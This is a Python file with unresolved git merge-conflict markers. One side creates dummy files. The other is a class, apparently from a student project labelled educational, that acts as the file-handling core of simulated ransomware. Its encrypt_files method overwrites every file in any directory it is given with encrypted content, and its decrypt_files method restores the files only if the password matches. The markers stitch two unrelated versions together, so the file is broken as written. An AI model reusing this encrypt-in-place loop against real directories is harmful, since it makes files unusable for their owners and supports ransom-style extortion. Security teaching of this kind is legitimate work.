<<<<<<< HEAD
# file_manager.py

import os

class FileManager:
    @staticmethod
    def create_dummy_files(directory):
        if not os.path.exists(directory):
            os.makedirs(directory)
        for i in range(5):
            filepath = os.path.join(directory, f"file{i}.txt")
            with open(filepath, "w") as file:
                file.write(f"Dummy content {i}")
=======
"""
Este arquivo faz parte de um projeto educacional que simula operações de criptografia
e descriptografia de arquivos. Ele é projetado para uso em ambiente controlado
e não possui intenções maliciosas.

Uso:
- Criptografia: Manipula arquivos dentro de uma pasta específica (`simulated_folder`).
- Descriptografia: Reverte a criptografia com base em uma senha.

Autor: [Henrique e Thiago]
"""

import os  # Módulo para interagir com o sistema de arquivos
from ransomware_interface import EncryptionMethod  # Interface para os métodos de criptografia e descriptografia

class FileManager:
    """
    Classe que gerencia operações de criptografia e descriptografia em arquivos.

    Atributos:
        encryption_method (EncryptionMethod): Instância do método de criptografia usado.
        password (str): Senha usada para criptografia e descriptografia.
    """
    def __init__(self, encryption_method: EncryptionMethod, password: str):
        """
        Inicializa o FileManager com um método de criptografia e uma senha.

        Args:
            encryption_method (EncryptionMethod): Método de criptografia a ser usado.
            password (str): Senha necessária para as operações.
        """
        self.encryption_method = encryption_method
        self.password = password

    def encrypt_files(self, directory: str):
        """
        Criptografa todos os arquivos em um diretório especificado.

        Args:
            directory (str): Caminho do diretório onde os arquivos estão localizados.

        Returns:
            list: Logs de sucesso ou erro para cada arquivo processado.
        """
        logs = []  # Lista para armazenar mensagens de log
        for filename in os.listdir(directory):  # Itera sobre todos os arquivos no diretório
            filepath = os.path.join(directory, filename)  # Cria o caminho completo do arquivo
            if os.path.isfile(filepath):  # Verifica se é um arquivo (não uma pasta)
                try:
                    with open(filepath, "rb") as file:  # Abre o arquivo em modo de leitura binária
                        content = file.read()  # Lê o conteúdo do arquivo
                    # Aplica o método de criptografia ao conteúdo
                    encrypted_content = self.encryption_method.encrypt(content, self.password)
                    with open(filepath, "wb") as file:  # Abre o arquivo em modo de escrita binária
                        file.write(encrypted_content)  # Escreve o conteúdo criptografado no arquivo
                    logs.append(f"Arquivo criptografado: {filename}")  # Adiciona log de sucesso
                except Exception as e:  # Captura qualquer exceção durante o processo
                    logs.append(f"Erro ao criptografar {filename}: {e}")  # Adiciona log de erro
        return logs  # Retorna a lista de logs

    def decrypt_files(self, directory: str, password: str):
        """
        Descriptografa todos os arquivos em um diretório especificado, caso a senha esteja correta.

        Args:
            directory (str): Caminho do diretório onde os arquivos estão localizados.
            password (str): Senha necessária para descriptografar os arquivos.

        Returns:
            list: Logs de sucesso ou erro para cada arquivo processado, ou mensagem de erro se a senha for incorreta.
        """
        if password != self.password:  # Verifica se a senha fornecida é válida
            return ["Senha incorreta! Não foi possível descriptografar os arquivos."]  # Retorna mensagem de erro

        logs = []  # Lista para armazenar mensagens de log
        for filename in os.listdir(directory):  # Itera sobre todos os arquivos no diretório
            filepath = os.path.join(directory, filename)  # Cria o caminho completo do arquivo
            if os.path.isfile(filepath):  # Verifica se é um arquivo (não uma pasta)
                try:
                    with open(filepath, "rb") as file:  # Abre o arquivo em modo de leitura binária
                        encrypted_content = file.read()  # Lê o conteúdo criptografado do arquivo
                    # Aplica o método de descriptografia ao conteúdo
                    decrypted_content = self.encryption_method.decrypt(encrypted_content, password)
                    with open(filepath, "wb") as file:  # Abre o arquivo em modo de escrita binária
                        file.write(decrypted_content)  # Escreve o conteúdo descriptografado no arquivo
                    logs.append(f"Arquivo descriptografado: {filename}")  # Adiciona log de sucesso
                except Exception as e:  # Captura qualquer exceção durante o processo
                    logs.append(f"Erro ao descriptografar {filename}: {e}")  # Adiciona log de erro
        return logs  # Retorna a lista de logs
>>>>>>> cf674cf (Entrega Final)
